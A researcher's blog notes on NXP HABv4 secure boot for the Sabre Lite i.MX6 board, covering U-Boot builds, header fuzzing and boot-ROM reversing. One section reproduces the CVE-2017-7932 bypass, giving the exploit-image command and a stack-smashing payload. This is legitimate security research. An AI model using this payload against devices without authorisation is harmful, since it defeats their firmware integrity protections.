---
title: "Exploring secured boot on the Sabre Lite i.MX6S (v1.3) SBC and NXP HABv4"
created: 2018-02-11
tags: 
  - firmware
  - fuzzing
  - secure-boot

image: /assets/images/image1.jpeg
---

This document is a linear review of my notes taken while exploring the Sabre Lite single-board-computer. It is a mildly expensive ([$200](https://boundarydevices.com/product/sabre-lite-imx6-sbc/) from Boundary Devices) SBC but it has a well documented secure boot implementation rooted in silicon ROM. It is a very good example of a vendor proprietary firmware verification mechanism. The goal of this article is purely an overview of notes, nothing here is novel or groundbreaking and it is not intended to be a tutorial.

<!--more-->

Trivia and Pro-Tips:

- SBC Name: [NXP/Freescale i.MX6](https://boundarydevices.com/product/sabre-lite-imx6-sbc/)
- Architecture Type: ARM Cortex™-A9
- Supported by OP-TEE: [https://github.com/OP-TEE/optee\_os](https://github.com/OP-TEE/optee_os)`PLATFORM=imx-mx6qsabrelite`
- Boundary Devices is very quick to respond to email requests for additional schematics and information.
- Known unpatchable vulnerable to i.MX HAB4 [CVE-2017-7932](https://community.nxp.com/docs/DOC-334996)

Note: The i.MX6 Sabre Lite hardware silicon revision 1.3 has a [well-known vulnerability](https://community.nxp.com/docs/DOC-334996) (stack-based overflow leading to arbitrary code execution) in parsing ASN.1 within the HAB4 ROM leading to a secure boot bypass discovered by QuarksLab. A 'normal world' user, someone controlling Linux on the SoC, may overwrite the initial boot code and secured boot certificates and bypass certificate validation.

![Sabre Lite case by ARTaylor with included heatsink](/assets/images/iMX6-SabreLite-case.jpeg)

Sabre Lite case by [ARTaylor](http://www2.artaylor.co.uk/store/index.php?route=product/product&product_id=53) with included heatsink

![iMX6-SabreLite](/assets/images/iMX6-SabreLite.jpeg)

## Building our own U-Boot

After reading specifications and guides for new SOCs/SBCs, I love to begin with their firmware by building and reading the 'special sauce'. The i.MX6 boards are supported in mainline U-Boot, but the [guides](https://boundarydevices.com/wiki/u-boot/) on Boundary Devices website recommend their branch: [https://github.com/boundarydevices/u-boot-imx6](https://github.com/boundarydevices/u-boot-imx6)

```sh
git checkout boundary-v2017.07
make nitrogen6q_defconfig

~/u-boot-imx6$ export ARCH=arm
~/u-boot-imx6$ export CROSS_COMPILE=arm-linux-gnueabihf-
~/u-boot-imx6$ make nitrogen6q_defconfig
~/u-boot-imx6$ make -j2
```

There is tooling to update the firmware using a U-Boot command and scripts stored in U-Boot environment variables. The U-Boot content and some i.MX/HAB custom image structures are stored in a small 2MB SPI flash on the Sabre Lite. We can update it whenever, say during Linux, but it is easiest to use the existing U-Boot tooling. See the `run upgradeu` command example below:

```
U-Boot 2015.07-15072-g45cfc85 (Jan 28 2016 - 17:41:49 -0700), Build: jenkins-uboot_v2015.07-30

CPU:   Freescale i.MX6Q rev1.2 996 MHz (running at 792 MHz)
Reset cause: WDOG
Board: SABRE Lite
[...]
=> run upgradeu
[...]
SF: Detected SST25VF016B with page size 256 Bytes, erase size 4 KiB, total 2 MiB
probed SPI ROM
check U-Boot
reading u-boot.nitrogen6q
531456 bytes read in 75 ms (6.8 MiB/s)
read 81c00 bytes from SD card
device 0 offset 0x400, size 0x81c00
SF: 531456 bytes @ 0x400 Read: OK
byte at 0x12000425 (0x20) != byte at 0x12400425 (0x10)
Total of 37 byte(s) were the same
Need U-Boot upgrade
[...]
device 0 offset 0x400, size 0x81c00
SF: 531456 bytes @ 0x400 Read: OK
Total of 531456 byte(s) were the same
---- U-Boot upgraded. reset
```

This copies U-Boot from the mSD to the SPI chip, SST25VF016B (2M), [http://ww1.microchip.com/downloads/en/DeviceDoc/S71271\_04.pdf](assets/S71271_04.pdf)

```
m25p80 spi0.0: sst25vf016b (2048 Kbytes)
3 ofpart partitions found on MTD device spi0.0
Creating 3 MTD partitions on "spi0.0":
0x000000000000-0x0000000c0000 : "U-Boot"
0x0000000c0000-0x0000000c2000 : "env"
0x0000000c2000-0x000000200000 : "splash"
spi_imx 2008000.ecspi: probed
```

Note that despite the HAB having a vulnerability, it would be fun to explore if the SPI could be held in WP/SRWD to prevent additional run-time writes. If there is a way to configure an alternate boot method from software this would be less ideal.

## Secured Boot Implementation

The i.MX series and Freescale have lots of documentation on their High-Assurance Boot (HAB) capabilities. It is semi-complex and offers a nice array of features. We will ignore most and just talk about how you 1-time program a set of 'root' RSA public keys, and how you write content to the SPI such that the HAB can verify and execute.

The ground truth for this information is the [IMX6DQRM](assets/IMX6DQRM.pdf) reference manual, since this is the SBC we are using in the experimentation.

For a very quick and dirty overview:

- A SHA256 of 4 'root' public keys is calculated and 1-time-programmed using eFuses.
- The boot ROM includes a library called HAB that reads and parses a header from the SPI flash.
- This image header includes x509/ASN.1 encoded public keys, which must match the programmed hash.
- Additional header properties and certificates allow key revocation and intermediate control of signing U-Boot.
- An out of band (USB) method is included for recovery.

![The i/MX image header, where Image Data can be U-Boot, followed by an optional CSF.](/assets/images/HAB-layout.png)

The i/MX image header, where Image Data can be U-Boot, followed by an optional CSF.

> “A key feature of the boot ROM is the ability to perform a secure boot or High Assurance Boot (HAB). This is supported by the HAB security library which is a subcomponent of the ROM code. HAB uses a combination of hardware and software together with a Public Key Infrastructure (PKI) protocol to protect the system from executing unauthorized programs. Before the HAB allows a user’s image to execute, the image must be signed. The signing process is done during the image build process by the private key holder and the signatures are then included as part of the final Program Image. If configured to do so, the ROM verifies the signatures using the public keys included in the Program Image.  
> In addition to supporting digital signature verification to authenticate Program Images, Encrypted boot is also supported. Encrypted boot can be used to prevent cloning of the Program Image directly off the boot device. A secure boot with HAB can be performed on all boot devices supported on the chip in addition to the Serial Downloader. The HAB library in the boot ROM also provides API functions, allowing additional boot chain components (bootloaders) to extend the secure boot chain. The out-of-fab setting for SEC\_CONFIG is the Open configuration in which the ROM/HAB performs image authentication, but all authentication errors are ignored and the image is still allowed to execute.”

— https://www.nxp.com/docs/en/reference-manual/IMX6SDLRM.pdf

Boundary devices provides an outstanding tutorial for setting up the high assurance boot: [https://boundarydevices.com/high-assurance-boot-hab-dummies/](https://boundarydevices.com/high-assurance-boot-hab-dummies/). There is one download required (the CST tool): [https://www.nxp.com/webapp/sps/download/license.jsp?colCode=IMX\_CST\_TOOL](https://www.nxp.com/webapp/sps/download/license.jsp?colCode=IMX_CST_TOOL)

After following this guide I could boot and check the HAB configuration using the U-Boot command `hab_status`.

```
U-Boot 2017.07-28563-g04d7ed8-dirty (Nov 15 2017 - 19:15:26 -0800)

CPU:   Freescale i.MX6Q rev1.2 at 792 MHz
Reset cause: POR
Board: sabrelite
I2C:   ready
DRAM:  1 GiB
MMC:   FSL_SDHC: 0, FSL_SDHC: 1
SF: Detected sst25vf016b with page size 256 Bytes, erase size 4 KiB, total 2 
[...]

=> hab_status

Secure boot disabled

HAB Configuration: 0xf0, HAB State: 0x66
No HAB Events Found!
```

And if I change 2 bytes in the U-Boot content (U-Boot to MeBoot), then `hab_status` should report a failure. In the below example I have not configured the 1-time program eFuse for secured boot enforcement:

```
MeBoot 2017.07-28563-g04d7ed8-dirty (Nov 15 2017 - 19:15:26 -0800)

CPU:   Freescale i.MX6Q rev1.2 at 792 MHz
Reset cause: POR
Board: sabrelite
I2C:   ready
DRAM:  1 GiB
MMC:   FSL_SDHC: 0, FSL_SDHC: 1
SF: Detected sst25vf016b with page size 256 Bytes, erase size 4 KiB, total 2 
[...]

=> hab_status

Secure boot disabled

HAB Configuration: 0xf0, HAB State: 0x66

--------- HAB Event 1 -----------------
event data:
        0xdb 0x00 0x1c 0x41 0x33 0x18 0xc0 0x00
        0xca 0x00 0x14 0x00 0x02 0xc5 0x1d 0x00
        0x00 0x00 0x16 0x3c 0x17 0x7f 0xf4 0x00
        0x00 0x08 0x5c 0x00

STS = HAB_FAILURE (0x33)
RSN = HAB_INV_SIGNATURE (0x18)
CTX = HAB_CTX_COMMAND (0xC0)
ENG = HAB_ENG_ANY (0x00)

--------- HAB Event 2 -----------------
event data:
        0xdb 0x00 0x14 0x41 0x33 0x0c 0xa0 0x00
        0x00 0x00 0x00 0x00 0x17 0x7f 0xf4 0x00
        0x00 0x00 0x00 0x20

STS = HAB_FAILURE (0x33)
RSN = HAB_INV_ASSERTION (0x0C)
CTX = HAB_CTX_ASSERT (0xA0)
ENG = HAB_ENG_ANY (0x00)
[...]
```

## Testing CVE-2017-7932 using USBArmory's Examples

The [USBArmory](https://github.com/inversepath/usbarmory) project uses i.MX53 SOCs, which are also effected by the HAB bypass vulnerabilities. They have published an excellent exploit generator and guide on their GitHub wiki.

Here are some great resources related to testing CVE-2017-7932:

- i.MX53 Secure Boot on the USBArmory: [https://github.com/inversepath/usbarmory/wiki/Secure-boot](https://github.com/inversepath/usbarmory/wiki/Secure-boot)
- Internal Boot ROM overview: [https://github.com/inversepath/usbarmory/wiki/Internal-Boot-ROM](https://github.com/inversepath/usbarmory/wiki/Internal-Boot-ROM)
- GPIO overview: [https://github.com/inversepath/usbarmory/wiki/GPIOs](https://github.com/inversepath/usbarmory/wiki/GPIOs)
- Detailed guide on enabling Secure Boot for the USBArmory: [https://deadmemes.net/2017/04/05/adventures-with-the-usb-armory-pt1/](https://deadmemes.net/2017/04/05/adventures-with-the-usb-armory-pt1/)
- Discovery, description, and details about the vulnerability from QuarksLab: [https://blog.quarkslab.com/vulnerabilities-in-high-assurance-boot-of-nxp-imx-microprocessors.html](https://blog.quarkslab.com/vulnerabilities-in-high-assurance-boot-of-nxp-imx-microprocessors.html)

It is simple to reproduce the vulnerability for the i.MX6.

```sh
$ git clone https://github.com/inversepath/usbarmory
$ cd usbarmory/software/secure_boot

./usbarmory_csftool --csf_key ../cst-2.3.3/keys/CSF1_1_sha256_4096_65537_v3_usr_key.pem --csf_crt ../cst-2.3.3/crts/CSF1_1_sha256_4096_65537_v3_usr_crt.pem -B ../cst-2.3.3/keys/IMG1_1_sha256_4096_65537_v3_usr_key.pem -b ../cst-2.3.3/crts/IMG1_1_sha256_4096_65537_v3_usr_crt.pem -I ../cst-2.3.3/crts/SRK_1_2_3_4_table.bin -x 1 -i ~/git/u-boot-imx6/u-boot.imx --hab_poc -o u-boot-im6-exploit.imx
IVT values:
  entry:                 0x17800000
  dcd:                   0x177ff42c
  boot_data:             0x177ff420
  self:                  0x177ff400
  csf:                   0x17885000
  boot_data.start:       0x177ff000
  boot_data.length:      0x88000
  boot_data.plugin_flag: 0x0
CSF padding size:        0x2000
Modifying certificate for HAB bypass PoC (CVE-2017-7932)

$ cat ~/git/u-boot-imx6/u-boot.imx ./u-boot-imx6-exploit.imx > u-boot-signed-imx6-exploit.imx
```

The onlu change needed to `usbarmory_csftool` is the location to return to (first jump within U-Boot), as the memory map on i.MX6 is slightly different. The iMX6SL is 0x1780:0000, this is the base address configured by U-Boot.

```ruby
  # stack smashing of 37 bytes + PC at 0x17800000 (U-Boot image entry point for iMX6SL)
  payload = "\x00" + "\x00\x00\x00\x00" * 9 + "\x00\x00\x80\x17" + "\x00\x00\x00\x00"
  payload_len = payload.length
```

The core common flaw here is applying complex parsing to untrusted data. This sparked another curiosity for the HAB image structures. _Are there sections of the header that are not included in the verification, aka can we modify bits without effecting the status of the boot?_ If we could then we could fuzz for additional corruptions. In the worst case if a corruption hung the HAB then we could recover via USB recovery or SPI flashing.

This next section is just fun, the TL;DR is there are other untrusted bytes but none led to corruptions. Also keep in mind this testing is non-exhaustive. In the case of the original vulnerability, we only need to find content that is read and parsed without verification, not content that is malleable and still results in a complete secure boot success.

To fuzz the image header I wanted a flow similar to:

- CPU reset
- Write the details of `hab_status` to SRAM
- Flash the SPI with the next iteration
- Boot Linux and dump the HAB status
- Repeat

These details will only make sense with knowledge of how the i.MX U-Boot update process works, essentially through complicated U-Boot environment scripts. To achieve my flow I will write the following scripts:

```sh
root@trusty-dev:~# fw_printenv bootcmd
bootcmd=hab_store; env save; run distro_bootcmd
root@trusty-dev:~# fw_printenv boot_scripts
boot_scripts=upgrade.scr 6x_bootscript
```

The `6x_bootscript` will be modified to reset automatically.

```diff
diff --git a/board/boundary/nitrogen6x/6x_upgrade.txt b/board/boundary/nitrogen6x/6x_upgrade.txt
index 86520e8..ad0a130 100644
--- a/board/boundary/nitrogen6x/6x_upgrade.txt
+++ b/board/boundary/nitrogen6x/6x_upgrade.txt
@@ -149,6 +149,7 @@ if itest.s "x" != "x${next}" ; then
        fi
 fi
 
-while echo "---- U-Boot upgraded. reset" ; do
- sleep 120
-done
+# while echo "---- U-Boot upgraded. reset" ; do
+#      sleep 120
+# done
+
```

Rebuild the bootscript using `mkimage`:

```sh
./tools/mkimage -A arm -O linux -T script -C none -a 0 -e 0 -n "boot script" -d ./board/boundary/nitrogen6x/6x_upgrade.txt 6x_upgrade
Image Name:   boot script
Created:      Sat Nov 18 12:35:37 2017
Image Type:   ARM Linux Script (uncompressed)
Data Size:    3576 Bytes = 3.49 KiB = 0.00 MiB
Load Address: 00000000
Entry Point:  00000000
Contents:
   Image 0: 3568 Bytes = 3.48 KiB = 0.00 MiB
```

The small HAB library in U-Boot will contain a new command called `hab_store`.

```diff
diff --git a/arch/arm/imx-common/hab.c b/arch/arm/imx-common/hab.c
index 523d0e3..2c78573 100644
--- a/arch/arm/imx-common/hab.c
+++ b/arch/arm/imx-common/hab.c
@@ -303,6 +303,49 @@ void display_event(uint8_t *event_data, size_t bytes)
        process_event_record(event_data, bytes);
 }
 
+int write_hab_status(void)
+{
+       uint32_t index = 0; /* Loop index */
+       uint8_t event_data[128]; /* Event data buffer */
+       size_t bytes = sizeof(event_data); /* Event size in bytes */
+       enum hab_config config = 0;
+       enum hab_state state = 0;
+       hab_rvt_report_event_t *hab_rvt_report_event;
+       hab_rvt_report_status_t *hab_rvt_report_status;
+       hab_rvt_report_event = hab_rvt_report_event_p;
+       hab_rvt_report_status = hab_rvt_report_status_p;
+       char varname[12];
+       struct record *rec;
+
+       /* Check HAB status */
+       int status = hab_rvt_report_status(&config, &state);
+       if (status != HAB_SUCCESS) {
+               /* Display HAB Error events */
+               while (hab_rvt_report_event(HAB_FAILURE, index, event_data,
+                                       &bytes) == HAB_SUCCESS) {
+
+                       rec = (struct record *)event_data;
+                       sprintf(varname, "hab_event%d", index + 1);
+                       setenv(varname, rsn_str[get_idx(hab_reasons,
+                               rec->contents[1])]);
+
+                       bytes = sizeof(event_data);
+                       index++;
+               }
+       }
+
+       setenv("hab_config", simple_itoa((int)config));
+       setenv("hab_state", simple_itoa((int)state));
+       setenv("hab_events", simple_itoa(index));
+
+       if (is_hab_enabled())
+               setenv("hab_sb", "1");
+       else
+               setenv("hab_sb", "0");
+
+       return 0;
+}
+
 int get_hab_status(void)
 {
        uint32_t index = 0; /* Loop index */
@@ -360,6 +403,18 @@ int do_hab_status(cmd_tbl_t *cmdtp, int flag, int argc, char * const argv[])
        return 0;
 }
 
+int do_hab_store(cmd_tbl_t *cmdtp, int flag, int argc, char * const argv[])
+{
+       if ((argc != 1)) {
+               cmd_usage(cmdtp);
+               return 1;
+       }
+
+       write_hab_status();
+
+       return 0;
+}
+
 static int do_authenticate_image(cmd_tbl_t *cmdtp, int flag, int argc,
                                char * const argv[])
 {
@@ -384,6 +439,12 @@ U_BOOT_CMD(
          );
 
 U_BOOT_CMD(
+               hab_store, CONFIG_SYS_MAXARGS, 1, do_hab_store,
+               "store HAB status to env",
+               ""
+         );
+
+U_BOOT_CMD(
                hab_auth_img, 3, 0, do_authenticate_image,
                "authenticate image via HAB",
                "addr ivt_offset\n"
```

Now, each time we upgrade U-Boot, our default boot will attempt to upgrade. We can also expect to have the HAB details available in Linux.

```sh
$ fw_printenv | grep hab_
bootcmd=hab_store; env save; run distro_bootcmd
hab_config=240
hab_events=0
hab_sb=0
hab_state=102
```

Now we want to corrupt a byte in the CSF image header and expect `hab_events == 0`. The size of out U-Boot region: 547840 (0x85c00) byes. Each boot and flash takes 39-40 seconds to complete a cycle. We can fuzz 2160 bytes in a day.

The resulting output of bytes that have no effect (note these are mostly region type bytes in the ASN.1 header:

```
[*] The previous offset had no effect: 547913
[*] The previous offset had no effect: 547916
[*] The previous offset had no effect: 547921
[*] The previous offset had no effect: 547922
[*] The previous offset had no effect: 547923
[*] The previous offset had no effect: 547924
```

## Reversing the HAB to locate the vulnerable ASN.1 parsing

The BootROM for the i.MX53 (USBArmory) and my i.MX6 Sabre Lite are memory mapped. The reference manual for each includes the range. The USBArmory wiki and project includes a [BootROM dump utility](https://github.com/inversepath/usbarmory/wiki/Internal-Boot-ROM) for convenience. This can be used to dump the i.MX6 BootROM too.

```sh
$ gcc -o imx53_bootrom-dump imx53_bootrom-dump.c
$ sudo ./imx53_bootrom-dump 0 16        > imx53-bootrom-0-16k.bin
$ sudo ./imx53_bootrom-dump 0x404000 48 > imx53-bootrom-1-48k.bin
$ shasum -a 256 *
bee79626931b045024a886e9f0fc298381a301e717894e08c33ea63cb99036c7  imx53-bootrom-0-16k.bin
22133edf0f93482a68e77727eab66f0545dccd7807d70bd9db0faf939674a4fb  imx53-bootrom-1-48k.bin
```

And on the i.MX6:

```sh
$ sudo ./imx53_bootrom-dump 0 96 > imx6-bootrom-0-96k.bin
$ shasum -a 256 *
e8b623ec6cde4c4cc8c655e1ca0ed700bd41c50a9b1bbeeae6a2748d1746fdb4  imx6-bootrom-0-96k.bin
```

![Memory map from https://www.nxp.com/docs/en/reference-manual/IMX6SDLRM.pdf](/assets/images/BootROM-memory.png)

Memory map from https://www.nxp.com/docs/en/reference-manual/IMX6SDLRM.pdf

Following the details in the [QuarksLab post](https://blog.quarkslab.com/vulnerabilities-in-high-assurance-boot-of-nxp-imx-microprocessors.html) we can find the x509 extension parsing code at offset `0x0000e27` on the i.MX6 and at `0x00003738` on the i.MX53.

The function `asn1_extract_bit_string` is given the bitstring content to parse, the size of the bitstring as reported by the ASN.1 encoding, and an address on the stack to write the decoded output.

![The x509_parse_next_extension code that calls asn1_extract_bit_string then checks the size.](/assets/images/iMX6-x509_parse_next_extension.png)

The x509\_parse\_next\_extension code that calls asn1\_extract\_bit\_string then checks the size.

- The imputs to `asn1_extract_bit_string` are: TAG, buffer\_start, buffer\_end, buffer\_out.
- The location of `buffer_out` is a location on the stack.
- The size of the bitstring is not checked before `0x0000e2d0`
- The size is checked after the stack is written at `0x0000e2d8`
- A return at this point (given our POC) will jump to U-Boot.

## Summary

The i.MX series SoCs are cool to play with. The HAB design includes quite a few features including various ways to accomplish the same signature verification or symmetric decryption (different internal libraries). I am not sure the source/history for needing various implementations, but that complexity is worrisome.

If we assume the HAB secured boot design is not vulnerable, there are a few remaining concerns. Parsing ASN.1 or requiring x509 certificates is not ideal. The verification process should require only public key content, there are much simpler and static ways to define the attributes of a RSA key. The flexibility of x509 and extensions could be represented in the image header. For example if a key is intended to only sign various components, represent that choice in the existing HAB image header that defines the key attributes.

There have been 20+ patches to U-Boot in the last several months focused on improving the U-Boot HAB libraries and bringing the verification process beyond U-Boot and SPI content to the rootfs and Kernel content. This exploration did not touch on any U-Boot libraries for extending SOC verified boot features (but this is a fun topic for the future).

If you are excited to use an i.MX6 Sabre Lite device and would like a fixed HAB be on the lookout for devices with silicon revision 1.4 or greater.

Unconfirmed list of patched devices:

- iMX6ULL revision 1.1 (B)
- iMX6QP revision 1.1 (B)
- iMX6SDL revision 1.4 (D)
